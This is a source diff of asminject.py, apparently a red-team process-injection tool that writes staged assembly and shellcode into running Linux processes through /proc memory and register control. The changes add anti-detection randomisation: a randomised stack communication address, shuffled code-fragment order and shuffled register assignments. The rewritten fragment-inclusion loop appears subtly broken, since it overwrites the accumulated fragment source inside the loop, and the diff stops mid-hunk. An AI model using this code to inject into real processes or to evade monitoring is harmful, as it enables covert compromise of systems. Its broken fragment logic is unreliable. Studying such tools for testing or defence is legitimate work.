@@ -12,8 +12,8 @@ BANNER = r"""
         \/                   \/\______|    \/     \/     \/|__|   \/
 
 asminject.py
-v0.23
-Ben Lincoln, Bishop Fox, 2022-06-04
+v0.24
+Ben Lincoln, Bishop Fox, 2022-06-09
 https://github.com/BishopFox/asminject
 based on dlinject, which is Copyright (c) 2019 David Buchanan
 dlinject source: https://github.com/DavidBuchanan314/dlinject
@@ -26,6 +26,7 @@ import json
 import math
 import os
 import psutil
+import random
 import re
 import secrets
 import shutil
@@ -124,6 +125,12 @@ class asminject_state_codes:
 
 class asminject_parameters:
     @staticmethod
+    def get_random_float_for_shuffle():
+        internal_range = 1000
+        internal_val = float(secrets.randbelow(internal_range + 1))
+        return internal_val / float(internal_range)
+    
+    @staticmethod
     def get_secure_random_not_in_list(max_value, list_of_existing_values):
         result = secrets.randbelow(max_value)
         while result in list_of_existing_values:
@@ -166,12 +173,20 @@ class asminject_parameters:
         return asminject_parameters.get_next_largest_multiple(r1, allocation_unit_size)
 
     def get_region_info_template(self, region_base_address, offset, length, perm_string):
-        if not region_base_address:
-            return None
         result = memory_map_entry()
+        if not region_base_address:
+            print("Missing base address!")
+            return result
+        # Can't check these for null because 0 matches "not"
+        # if not offset:
+            # print("Missing offset!")
+            # return result
+        # if not length:
+            # print("Missing length!")
+            # return result
         result.start_address = region_base_address + offset
         result.end_address = result.start_address + length
-        result.set_permissions_from_string("rw-p")
+        result.set_permissions_from_string(perm_string)
         return result
 
     def get_region_info_communication(self):
@@ -185,6 +200,25 @@ class asminject_parameters:
     
     def get_region_info_arbitrary_data(self):
         return self.get_region_info_template(self.read_write_region_address, self.rwr_arbitrary_data_offset, self.rwr_arbitrary_data_length, "rw-p")
+
+    def get_base_communication_address(self):
+        if self.read_write_region_address:
+            if self.get_region_info_communication().start_address:
+                return self.get_region_info_communication().start_address
+        return self.initial_communication_address
+
+    # this location is randomized to make detection more difficult
+    def set_initial_communication_address(self):
+        if self.existing_read_write_address:
+            # If there's an existing r/w block in use, no need to write to the stack at all
+            self.initial_communication_address = self.existing_read_write_address
+        else:
+            stack_size = self.stack_region.end_address - self.stack_region.start_address
+            # Basically just use most of the upper half of the stack region, evenly divisible by the word length
+            comms_address_min_offset = int(stack_size / 2)
+            comms_address_max_offset = stack_size - (self.register_size * 6)
+            comms_address_offset = asminject_parameters.get_random_memory_block_size(comms_address_min_offset, comms_address_max_offset, self.register_size)
+            self.initial_communication_address = self.stack_region.start_address + comms_address_offset
 
     def __init__(self):
         # memory regions must be evenly divisible by this amount
@@ -200,6 +234,10 @@ class asminject_parameters:
         # Temporary communication address for use before stage one allocates the r/w block
         self.communication_address_offset = -40
         self.communication_address_backup_size = 24
+        self.initial_communication_address = None
+        
+        self.general_purpose_register_list = []
+        
         # 512 is the minimum for the x86-64 fxsave instruction
         #self.cpu_state_size = 1024
         # Might need to make this dynamic based on the stack backup size
@@ -242,6 +280,8 @@ class asminject_parameters:
         self.rwr_reserved_length = 0x3000
         # sub-region X: arbitrary read/write block 
         self.set_rwr_arbitrary_data_block_values()
+        
+        self.stack_region = None
         
         # number of seconds the stage 1 and stage 2 code should sleep
         # every iteration they are waiting for something
@@ -311,6 +351,7 @@ class asminject_parameters:
         self.precompiled_shellcode_label = "precompiled_shellcode"
         self.post_shellcode_label = "post_shellcode_section"
         self.inline_shellcode_placeholder = "[VARIABLE:INLINE_SHELLCODE:VARIABLE]"
+        self.fragment_placeholder = "[FRAGMENTS]"
         
         self.enable_debugging_output = False
         self.clear_payload_memory_after_execution = False
@@ -319,6 +360,10 @@ class asminject_parameters:
         
         self.instruction_pointer_register_name = "RIP"
         self.stack_pointer_register_name = "RSP"
+        
+        self.saved_instruction_pointer_value = None
+        self.saved_stack_pointer_value = None
+        self.code_backup_length = None
         
         # deallocate the r/w memory allocated by stage 1 when stage 2 is about to exit
         # haven't come up with a way to deallocate the r/x memory
@@ -374,6 +419,7 @@ class asminject_parameters:
             self.stack_backup_size = 8 * 16
             self.instruction_pointer_register_name = "RIP"
             self.stack_pointer_register_name = "RSP"
+            self.general_purpose_register_list = ["rax", "rbx", "rcx", "rdx", "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15"]
         if self.architecture == "arm32":
             self.register_size = 4
             self.register_size_format_string = 'L'
@@ -387,6 +433,88 @@ class asminject_parameters:
             self.stage_sleep_seconds = 2
             self.instruction_pointer_register_name = "pc"
             self.stack_pointer_register_name = "sp"
+            self.general_purpose_register_list = ["r0", "r1", "r2", "r3", "r4", "r5", "r6", "r7", "r8", "r9", "r10", "r11"]
+    
+    def get_value_or_placeholder(self, value, placeholder_value):
+        if value:
+            return value
+        else:
+            return placeholder_value
+    
+    def get_hex_value_or_placeholder(self, value, placeholder_value):
+        result_temp = self.get_value_or_placeholder(value, placeholder_value)
+        if result_temp:
+            return hex(result_temp)
+        return '____BUG_IN_CODE____'
+        
+    def get_general_purpose_register_replacement_map(self):
+        result = {}
+        gpr_list = []
+        for i in range(0, len(self.general_purpose_register_list)):
+            gpr_list.append(self.general_purpose_register_list[i])
+        random.shuffle(gpr_list, asminject_parameters.get_random_float_for_shuffle)
+        for i in range(0, len(self.general_purpose_register_list)):
+            result[f"%r{i}%"] = gpr_list[i]
+        return result
+    
+    # placeholder_value_address is a value that represents a valid address
+    # so that e.g. the stage 2 test assembly will succeed
+    # leave it as None for the real assembly so that bugs won't cause silent failures
+    def get_replacement_variable_map(self, placeholder_value_address = None):
+        result = {}
+        for k in self.custom_replacements.keys():
+            result[k] = self.custom_replacements[k]
+    
+        result['[VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.get_region_info_arbitrary_data().start_address, placeholder_value_address)}"
+        #result['[VARIABLE:CLEAR_PAYLOAD_MEMORY_VALUE:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.clear_payload_memory_value, placeholder_value_address)}"
+        result['[VARIABLE:COMMUNICATION_ADDRESS:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.get_base_communication_address(), placeholder_value_address)}"
+        result['[VARIABLE:CPU_STATE_SIZE:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.rwr_cpu_state_backup_length, placeholder_value_address)}"
+        result['[VARIABLE:EXISTING_STACK_BACKUP_ADDRESS:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.get_region_info_stack_backup().start_address, placeholder_value_address)}"
+        result['[VARIABLE:EXISTING_STACK_BACKUP_LOCATION_OFFSET:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.rwr_stack_backup_offset, placeholder_value_address)}"
+        result['[VARIABLE:INSTRUCTION_POINTER:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.saved_instruction_pointer_value, placeholder_value_address)}"
+        result['[VARIABLE:LEN_CODE_BACKUP:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.code_backup_length, placeholder_value_address)}"
+        result['[VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]'] = f"{self.post_shellcode_label}"
+        result['[VARIABLE:PRECOMPILED_SHELLCODE_LABEL:VARIABLE]'] = f"{self.precompiled_shellcode_label}"
+        result['[VARIABLE:READ_EXECUTE_ADDRESS:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.read_execute_region_address, placeholder_value_address)}"
+        result['[VARIABLE:READ_EXECUTE_REGION_SIZE:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.read_execute_region_size, placeholder_value_address)}"
+        result['[VARIABLE:READ_WRITE_ADDRESS:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.read_write_region_address, placeholder_value_address)}"
+        rw_region_address = None
+        if self.read_write_region_address and self.read_write_region_size:
+            rw_region_address = self.read_write_region_address + self.read_write_region_size
+        result['[VARIABLE:READ_WRITE_ADDRESS_END:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(rw_region_address, placeholder_value_address)}"
+        result['[VARIABLE:READ_WRITE_REGION_SIZE:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.read_write_region_size, placeholder_value_address)}"
+        result['[VARIABLE:STACK_POINTER:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.saved_stack_pointer_value, placeholder_value_address)}"
+        result['[VARIABLE:STAGE_SLEEP_SECONDS:VARIABLE]'] = f"{self.stage_sleep_seconds}"
+        
+        
+        # state variables
+        result['[VARIABLE:STATE_SWITCH_TO_NEW_COMMUNICATION_ADDRESS:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.state_variables.state_switch_to_new_communication_address, placeholder_value_address)}"
+        result['[VARIABLE:STATE_READY_FOR_STAGE_TWO_WRITE:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.state_variables.state_ready_for_stage_two_write, placeholder_value_address)}"
+        result['[VARIABLE:STATE_STAGE_TWO_WRITTEN:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.state_variables.state_stage_two_written, placeholder_value_address)}"
+        result['[VARIABLE:STATE_READY_FOR_MEMORY_RESTORE:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.state_variables.state_ready_for_memory_restore, placeholder_value_address)}"
+        result['[VARIABLE:STATE_MEMORY_RESTORED:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.state_variables.state_memory_restored, placeholder_value_address)}"
+        result['[VARIABLE:STATE_PAYLOAD_TO_SCRIPT_MESSAGE:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.state_variables.state_payload_to_script_message, placeholder_value_address)}"
+        result['[VARIABLE:STATE_SCRIPT_TO_PAYLOAD_MESSAGE:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.state_variables.state_script_to_payload_message, placeholder_value_address)}"
+        result['[VARIABLE:STATE_MESSAGE_RECEIVED:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.state_variables.state_message_received, placeholder_value_address)}"
+        result['[VARIABLE:STATE_PAYLOAD_SHOULD_EXIT:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.state_variables.state_payload_should_exit, placeholder_value_address)}"
+        result['[VARIABLE:STATE_PAYLOAD_EXITING:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.state_variables.state_payload_exiting, placeholder_value_address)}"
+        result['[VARIABLE:STATE_PAYLOAD_AWAITING_STRING:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.state_variables.state_payload_awaiting_string, placeholder_value_address)}"
+        result['[VARIABLE:STATE_PAYLOAD_AWAITING_BINARY_DATA:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.state_variables.state_payload_awaiting_binary_data, placeholder_value_address)}"
+        result['[VARIABLE:STATE_PAYLOAD_AWAITING_SIGNED_INTEGER:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.state_variables.state_payload_awaiting_signed_integer, placeholder_value_address)}"
+        result['[VARIABLE:STATE_PAYLOAD_AWAITING_UNSIGNED_INTEGER:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.state_variables.state_payload_awaiting_unsigned_integer, placeholder_value_address)}"
+        
+        # state message type indicators
+        result['[VARIABLE:MESSAGE_TYPE_SIGNED_INTEGER:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.state_variables.message_type_signed_integer, placeholder_value_address)}"
+        result['[VARIABLE:MESSAGE_TYPE_UNSIGNED_INTEGER:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.state_variables.message_type_unsigned_integer, placeholder_value_address)}"
+        result['[VARIABLE:MESSAGE_TYPE_POINTER_TO_BINARY_DATA:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.state_variables.message_type_pointer_to_binary_data, placeholder_value_address)}"
+        result['[VARIABLE:MESSAGE_TYPE_POINTER_TO_STRING_DATA:VARIABLE]'] = f"{self.get_hex_value_or_placeholder(self.state_variables.message_type_pointer_to_string_data, placeholder_value_address)}"
+       
+        # general purpose register replacements
+        #gpr_map = self.get_general_purpose_register_replacement_map()
+        #for k in gpr_map.keys():
+        #    result[k] = gpr_map[k]
+       
+        return result
     
     def get_map_file_path(self):
         return f"/proc/{self.pid}/maps"
@@ -673,6 +801,20 @@ def log_warning(msg, ansi=True):
 def log_error(msg, ansi=True):
     log(msg, "red", "!", ansi)
     #raise Exception(msg)
+    
+def get_code_fragment(injection_params, fragment_file_name):
+    fragment_file_path = os.path.join(injection_params.base_script_path, "asm", injection_params.architecture, injection_params.fragment_directory_name, fragment_file_name)
+    fragment_source = None
+    if not os.path.isfile(fragment_file_path):
+        log_error(f"Could not find the assembly source code fragment '{fragment_file_path}' referenced in the payload", ansi=injection_params.ansi)
+        return None
+    try:
+        with open(fragment_file_path, "r") as fragment_source_file:
+            fragment_source = fragment_source_file.read()
+    except Exception as e:
+        log_error(f"Could not read assembly source code fragment '{fragment_file_path}' referenced in the payload: {e}", ansi=injection_params.ansi)
+        return None
+    return fragment_source
 
 def assemble(source, injection_params, memory_map_data, replacements = {}):
     formatted_source = source
@@ -682,38 +824,45 @@ def assemble(source, injection_params, memory_map_data, replacements = {}):
             log(f"Library base entry: '{lname}'", ansi=injection_params.ansi)
     
     # Recursively replace any fragment references with actual file content
+    initial_fragment_list = []
+    # build a list of just the unique fragment references
+    fragment_placeholders_matches = re.finditer(r'(\[FRAGMENT:)(.*?)(:FRAGMENT\])', formatted_source)
+    for match in fragment_placeholders_matches:
+        match_text = match.group(0)
+        fragment_file_name = match.group(2)
+        if fragment_file_name not in initial_fragment_list:
+            initial_fragment_list.append(match.group(0))
+            formatted_source = formatted_source.replace(match_text, "")
+    
+    # randomize initial fragment order
+    random.shuffle(initial_fragment_list, asminject_parameters.get_random_float_for_shuffle)
+    fragment_source = ""
+    for i in range (0, len(initial_fragment_list)):
+        fragment_source = f"{fragment_source}{os.linesep}{os.linesep}{initial_fragment_list[i]}"
+
     fragment_refs_found = True
     recursion_count = 0
-    recursion_count_list = {}
     while fragment_refs_found:
         found_this_iteration = 0
         fragment_placeholders = []
-        fragment_placeholders_matches = re.finditer(r'(\[FRAGMENT:)(.*?)(:FRAGMENT\])', formatted_source)
+        fragment_placeholders_matches = re.finditer(r'(\[FRAGMENT:)(.*?)(:FRAGMENT\])', fragment_source)
         for match in fragment_placeholders_matches:
             fragment_file_name = match.group(2)
-            if fragment_file_name in recursion_count_list.keys():
-                recursion_count_list[fragment_file_name] += 1
+            match_text = match.group(0)
+            if fragment_file_name in fragment_placeholders:
+                # fragment has already been incorporated
+                fragment_source = fragment_source.replace(match_text, "")
             else:
-                recursion_count_list[fragment_file_name] = 1
-            if fragment_file_name not in fragment_placeholders:
+                # new fragment
                 if injection_params.enable_debugging_output:
                     log(f"Found code fragment placeholder '{fragment_file_name}' in assembly code", ansi=injection_params.ansi)
                 fragment_placeholders.append(fragment_file_name)
         for fragment_file_name in fragment_placeholders:
-            fragment_file_path = os.path.join(injection_params.base_script_path, "asm", injection_params.architecture, injection_params.fragment_directory_name, fragment_file_name)
-            if not os.path.isfile(fragment_file_path):
-                log_error(f"Could not find the assembly source code fragment '{fragment_file_path}' referenced in the payload", ansi=injection_params.ansi)
-                return None
-            try:
-                with open(fragment_file_path, "r") as fragment_source_file:
-                    fragment_source = fragment_source_file.read()
-                    string_to_replace = f"[FRAGMENT:{fragment_file_name}:FRAGMENT]"
-                    if injection_params.enable_debugging_output:
-                        log(f"Replacing '{string_to_replace}' with the content of file '{fragment_file_path}' in assembly code", ansi=injection_params.ansi)
-                    formatted_source = formatted_source.replace(string_to_replace, fragment_source)
-            except Exception as e:
-                log_error(f"Could not read assembly source code fragment '{fragment_file_path}' referenced in the payload: {e}", ansi=injection_params.ansi)
-                return None
+            fragment_source = get_code_fragment(injection_params, fragment_file_name)
+            string_to_replace = f"[FRAGMENT:{fragment_file_name}:FRAGMENT]"
+            if injection_params.enable_debugging_output:
+                log(f"Replacing '{string_to_replace}' with the content of file '{fragment_file_name}' in assembly code", ansi=injection_params.ansi)
+            fragment_source = fragment_source.replace(string_to_replace, fragment_source)
         if len(fragment_placeholders) == 0:
             fragment_refs_found = False
         else:
@@ -733,6 +882,8 @@ def assemble(source, injection_params, memory_map_data, replacements = {}):
                         recursion_reference_string = f"{recursion_reference_string}, {new_key_string}"
                 log_error(f"Reached maximum recursion count of {injection_params.max_fragment_recursion} while importing assembly code fragments. This is usually due to a reference loop, such as fragment A referencing fragment B, while fragment B also references fragment A. The fragment files with the highest counts in the following list are most likely responsible: {recursion_reference_string}", ansi=injection_params.ansi)
                 return None
+    
+    formatted_source = formatted_source.replace(injection_params.fragment_placeholder, fragment_source)
     
     for rname in replacements.keys():
         if injection_params.enable_debugging_output:
@@ -1119,7 +1270,6 @@ def restore_memory_regions(injection_params, backed_up_memory_map_data):
         except Exception as e:
             log_error(f"Couldn't restore the memory region {region_description_string}: {e}", ansi=injection_params.ansi)
 
-
 def asminject(injection_params):
     log(f"Starting at {injection_params.get_timestamp_string()} (UTC)", ansi=injection_params.ansi)
     map_file_path = injection_params.get_map_file_path()
@@ -1161,33 +1311,36 @@ def asminject(injection_params):
 
     # Do basic setup first to perform a validation on the stage 2 code
     # (Avoids injecting stage 1 only to have stage 2 fail)
-    stack_region = memory_map_data.get_first_region_for_named_file("[stack]")
-    communication_address = stack_region.end_address + injection_params.communication_address_offset
+    injection_params.stack_region = memory_map_data.get_first_region_for_named_file("[stack]")
+    #injection_params.initial_communication_address = stack_region.end_address + injection_params.communication_address_offset
+    injection_params.set_initial_communication_address()
 
-    stage2_replacements = injection_params.custom_replacements
-    # these values will stay the same even for the real assembly
+    # stage2_replacements = injection_params.custom_replacements
+    # # these values will stay the same even for the real assembly
     
-    stage2_replacements['[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]'] = f"{injection_params.stack_backup_size}"
-    stage2_replacements['[VARIABLE:COMMUNICATION_ADDRESS:VARIABLE]'] = f"{communication_address}"
-    stage2_replacements['[VARIABLE:STATE_READY_FOR_MEMORY_RESTORE:VARIABLE]'] = f"{injection_params.state_variables.state_ready_for_memory_restore}"
-    stage2_replacements['[VARIABLE:CPU_STATE_SIZE:VARIABLE]'] = f"{injection_params.rwr_cpu_state_backup_length}"
-    stage2_replacements['[VARIABLE:STAGE_SLEEP_SECONDS:VARIABLE]'] = f"{injection_params.stage_sleep_seconds}"
-    stage2_replacements['[VARIABLE:PRECOMPILED_SHELLCODE_LABEL:VARIABLE]'] = f"{injection_params.precompiled_shellcode_label}"
-    stage2_replacements['[VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]'] = f"{injection_params.post_shellcode_label}"
-    #stage2_replacements['[VARIABLE:CLEAR_PAYLOAD_MEMORY_VALUE:VARIABLE]'] = f"{injection_params.clear_payload_memory_value}"
-    # these values are placeholders - real values will be determined by result of stage 1
-    stage2_replacements['[VARIABLE:STATE_MEMORY_RESTORED:VARIABLE]'] = f"{injection_params.state_variables.state_memory_restored}"
-    stage2_replacements['[VARIABLE:STACK_POINTER_MINUS_STACK_BACKUP_SIZE:VARIABLE]'] = f"{(communication_address-injection_params.stack_backup_size)}"
-    stage2_replacements['[VARIABLE:INSTRUCTION_POINTER:VARIABLE]'] = f"{communication_address}"
-    stage2_replacements['[VARIABLE:STACK_POINTER:VARIABLE]'] = f"{communication_address}"
-    stage2_replacements['[VARIABLE:READ_EXECUTE_ADDRESS:VARIABLE]'] = f"{communication_address}"
-    stage2_replacements['[VARIABLE:READ_EXECUTE_REGION_SIZE:VARIABLE]'] = f"{injection_params.read_execute_region_size}"
-    stage2_replacements['[VARIABLE:READ_WRITE_ADDRESS:VARIABLE]'] = f"{communication_address}"
-    stage2_replacements['[VARIABLE:READ_WRITE_REGION_SIZE:VARIABLE]'] = f"{injection_params.read_write_region_size}"
-    stage2_replacements['[VARIABLE:EXISTING_STACK_BACKUP_ADDRESS:VARIABLE]'] = f"{communication_address}"
-    stage2_replacements['[VARIABLE:NEW_STACK_ADDRESS:VARIABLE]'] = f"{communication_address}"
-    stage2_replacements['[VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]'] = f"{communication_address}"
-    stage2_replacements['[VARIABLE:READ_WRITE_ADDRESS_END:VARIABLE]'] = f"{communication_address}"
+    # stage2_replacements['[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]'] = f"{injection_params.stack_backup_size}"
+    # stage2_replacements['[VARIABLE:COMMUNICATION_ADDRESS:VARIABLE]'] = f"{communication_address}"
+    # stage2_replacements['[VARIABLE:STATE_READY_FOR_MEMORY_RESTORE:VARIABLE]'] = f"{injection_params.state_variables.state_ready_for_memory_restore}"
+    # stage2_replacements['[VARIABLE:CPU_STATE_SIZE:VARIABLE]'] = f"{injection_params.rwr_cpu_state_backup_length}"
+    # stage2_replacements['[VARIABLE:STAGE_SLEEP_SECONDS:VARIABLE]'] = f"{injection_params.stage_sleep_seconds}"
+    # stage2_replacements['[VARIABLE:PRECOMPILED_SHELLCODE_LABEL:VARIABLE]'] = f"{injection_params.precompiled_shellcode_label}"
+    # stage2_replacements['[VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]'] = f"{injection_params.post_shellcode_label}"
+    # #stage2_replacements['[VARIABLE:CLEAR_PAYLOAD_MEMORY_VALUE:VARIABLE]'] = f"{injection_params.clear_payload_memory_value}"
+    # # these values are placeholders - real values will be determined by result of stage 1
+    # stage2_replacements['[VARIABLE:STATE_MEMORY_RESTORED:VARIABLE]'] = f"{injection_params.state_variables.state_memory_restored}"
+    # stage2_replacements['[VARIABLE:STACK_POINTER_MINUS_STACK_BACKUP_SIZE:VARIABLE]'] = f"{(communication_address-injection_params.stack_backup_size)}"
+    # stage2_replacements['[VARIABLE:INSTRUCTION_POINTER:VARIABLE]'] = f"{communication_address}"
+    # stage2_replacements['[VARIABLE:STACK_POINTER:VARIABLE]'] = f"{communication_address}"
+    # stage2_replacements['[VARIABLE:READ_EXECUTE_ADDRESS:VARIABLE]'] = f"{communication_address}"
+    # stage2_replacements['[VARIABLE:READ_EXECUTE_REGION_SIZE:VARIABLE]'] = f"{injection_params.read_execute_region_size}"
+    # stage2_replacements['[VARIABLE:READ_WRITE_ADDRESS:VARIABLE]'] = f"{communication_address}"
+    # stage2_replacements['[VARIABLE:READ_WRITE_REGION_SIZE:VARIABLE]'] = f"{injection_params.read_write_region_size}"
+    # stage2_replacements['[VARIABLE:EXISTING_STACK_BACKUP_ADDRESS:VARIABLE]'] = f"{communication_address}"
+    # stage2_replacements['[VARIABLE:NEW_STACK_ADDRESS:VARIABLE]'] = f"{communication_address}"
+    # stage2_replacements['[VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]'] = f"{communication_address}"
+    # stage2_replacements['[VARIABLE:READ_WRITE_ADDRESS_END:VARIABLE]'] = f"{communication_address}"
+
+    stage2_replacements = injection_params.get_replacement_variable_map(placeholder_value_address = injection_params.get_base_communication_address())
 
     stage2_source_code = ""
     shellcode_source_code = ""
@@ -1199,12 +1352,12 @@ def asminject(injection_params):
         sys.exit(1)
     
     if injection_params.clear_payload_memory_after_execution:
-        stage2_source_code = stage2_source_code.replace("[CLEAR_RW_MEMORY]", "[FRAGMENT:stage2-overwrite_read-write.s:FRAGMENT]")
+        stage2_source_code = stage2_source_code.replace("[CLEAR_RW_MEMORY]", get_code_fragment(injection_params, "stage2-overwrite_read-write.s"))
     else:
         stage2_source_code = stage2_source_code.replace("[CLEAR_RW_MEMORY]", "")
 
     if injection_params.deallocate_memory:
-        stage2_source_code = stage2_source_code.replace("[DEALLOCATE_MEMORY]", "[FRAGMENT:stage2-deallocate.s:FRAGMENT]")
+        stage2_source_code = stage2_source_code.replace("[DEALLOCATE_MEMORY]", get_code_fragment(injection_params, "stage2-deallocate.s"))
     else:
         log_warning(f"Memory allocated by the staging code will not be deallocated after the payload executes", ansi=injection_params.ansi)
         stage2_source_code = stage2_source_code.replace("[DEALLOCATE_MEMORY]", "")
@@ -1235,7 +1388,6 @@ def asminject(injection_params):
                     else:
                         precompiled_shellcode_as_hex = f"{precompiled_shellcode_as_hex}, {hex(precompiled_payload[byte_num])}"
                 
-                #shellcode_data_section = f"{shellcode_data_section}\n{injection_params.precompiled_shellcode_label}:\n\t.byte {precompiled_shellcode_as_hex}"
                 shellcode_as_inline_bytes = f"{injection_params.precompiled_shellcode_label}:\n\t.byte {precompiled_shellcode_as_hex}\n\n"
                 shellcode_data_section = shellcode_data_section.replace(injection_params.inline_shellcode_placeholder, shellcode_as_inline_bytes)
                     
@@ -1329,19 +1481,17 @@ def asminject(injection_params):
     try:
         got_initial_syscall_data = False
         syscall_check_result = None
-        instruction_pointer = 0
-        stack_pointer = 0
         while not got_initial_syscall_data:
             syscall_check_result = get_syscall_values(injection_params, injection_params.pid)
-            instruction_pointer = syscall_check_result[injection_params.instruction_pointer_register_name]
-            stack_pointer = syscall_check_result[injection_params.stack_pointer_register_name]
-            if instruction_pointer == 0 or stack_pointer == 0:
+            injection_params.saved_instruction_pointer_value = syscall_check_result[injection_params.instruction_pointer_register_name]
+            injection_params.saved_stack_pointer_value = syscall_check_result[injection_params.stack_pointer_register_name]
+            if injection_params.saved_instruction_pointer_value == 0 or injection_params.saved_stack_pointer_value == 0:
                 log_error("Couldn't get current syscall data", ansi=injection_params.ansi)
                 time.sleep(injection_params.sleep_time_waiting_for_syscalls)
             else:
                 got_initial_syscall_data = True
-        log(f"{injection_params.instruction_pointer_register_name}: {hex(instruction_pointer)}", ansi=injection_params.ansi)
-        log(f"{injection_params.stack_pointer_register_name}: {hex(stack_pointer)}", ansi=injection_params.ansi)
+        log(f"{injection_params.instruction_pointer_register_name}: {hex(injection_params.saved_instruction_pointer_value)}", ansi=injection_params.ansi)
+        log(f"{injection_params.stack_pointer_register_name}: {hex(injection_params.saved_stack_pointer_value)}", ansi=injection_params.ansi)
         
         if continue_executing:
             log(f"Using: {hex(injection_params.state_variables.state_ready_for_stage_two_write)} for 'ready for stage two write' state value", ansi=injection_params.ansi)
@@ -1352,32 +1502,36 @@ def asminject(injection_params):
             with open(stage1_path, "r") as stage1_code:
                 stage_1_code = stage1_code.read()
             
-            stage1_replacements = {}
-            stage1_replacements['[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]'] = f"{injection_params.stack_backup_size}"
-            stage1_replacements['[VARIABLE:STACK_POINTER_MINUS_STACK_BACKUP_SIZE:VARIABLE]'] = f"{(stack_pointer - injection_params.stack_backup_size)}"
-            stage1_replacements['[VARIABLE:COMMUNICATION_ADDRESS:VARIABLE]'] = f"{communication_address}"
-            stage1_replacements['[VARIABLE:STATE_READY_FOR_STAGE_TWO_WRITE:VARIABLE]'] = f"{injection_params.state_variables.state_ready_for_stage_two_write}"
-            stage1_replacements['[VARIABLE:STATE_STAGE_TWO_WRITTEN:VARIABLE]'] = f"{injection_params.state_variables.state_stage_two_written}"
-            stage1_replacements['[VARIABLE:STATE_READY_FOR_MEMORY_RESTORE:VARIABLE]'] = f"{injection_params.state_variables.state_ready_for_memory_restore}"
-            stage1_replacements['[VARIABLE:READ_EXECUTE_REGION_SIZE:VARIABLE]'] = f"{injection_params.read_execute_region_size}"
-            stage1_replacements['[VARIABLE:READ_WRITE_REGION_SIZE:VARIABLE]'] = f"{injection_params.read_write_region_size}"
-            stage1_replacements['[VARIABLE:CPU_STATE_SIZE:VARIABLE]'] = f"{injection_params.rwr_cpu_state_backup_length}"
-            stage1_replacements['[VARIABLE:STAGE_SLEEP_SECONDS:VARIABLE]'] = f"{injection_params.stage_sleep_seconds}"
-            stage1_replacements['[VARIABLE:EXISTING_STACK_BACKUP_LOCATION_OFFSET:VARIABLE]'] = f"{injection_params.rwr_stack_backup_offset}"
+            # stage1_replacements = {}
+            # stage1_replacements['[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]'] = f"{injection_params.stack_backup_size}"
+            # stage1_replacements['[VARIABLE:STACK_POINTER_MINUS_STACK_BACKUP_SIZE:VARIABLE]'] = f"{(injection_params.saved_stack_pointer_value - injection_params.stack_backup_size)}"
+            # stage1_replacements['[VARIABLE:COMMUNICATION_ADDRESS:VARIABLE]'] = f"{injection_params.get_base_communication_address()}"
+            # stage1_replacements['[VARIABLE:STATE_READY_FOR_STAGE_TWO_WRITE:VARIABLE]'] = f"{injection_params.state_variables.state_ready_for_stage_two_write}"
+            # stage1_replacements['[VARIABLE:STATE_STAGE_TWO_WRITTEN:VARIABLE]'] = f"{injection_params.state_variables.state_stage_two_written}"
+            # stage1_replacements['[VARIABLE:STATE_READY_FOR_MEMORY_RESTORE:VARIABLE]'] = f"{injection_params.state_variables.state_ready_for_memory_restore}"
+            # stage1_replacements['[VARIABLE:READ_EXECUTE_REGION_SIZE:VARIABLE]'] = f"{injection_params.read_execute_region_size}"
+            # stage1_replacements['[VARIABLE:READ_WRITE_REGION_SIZE:VARIABLE]'] = f"{injection_params.read_write_region_size}"
+            # stage1_replacements['[VARIABLE:CPU_STATE_SIZE:VARIABLE]'] = f"{injection_params.rwr_cpu_state_backup_length}"
+            # stage1_replacements['[VARIABLE:STAGE_SLEEP_SECONDS:VARIABLE]'] = f"{injection_params.stage_sleep_seconds}"
+            # stage1_replacements['[VARIABLE:EXISTING_STACK_BACKUP_LOCATION_OFFSET:VARIABLE]'] = f"{injection_params.rwr_stack_backup_offset}"
+            
+            
             if injection_params.existing_read_execute_address:
                 injection_params.read_execute_region_address = injection_params.existing_read_execute_address
                 log_warning(f"Attempting to reuse existing read/execute block at {hex(injection_params.read_execute_region_address)}")
-                stage1_replacements['[VARIABLE:READ_EXECUTE_ADDRESS:VARIABLE]'] = f"{hex(injection_params.read_execute_region_address)}"
-                stage_1_code = stage_1_code.replace("[READ_EXECUTE_ALLOCATE_OR_REUSE]", "[FRAGMENT:stage1-use_existing_read-execute.s:FRAGMENT]")
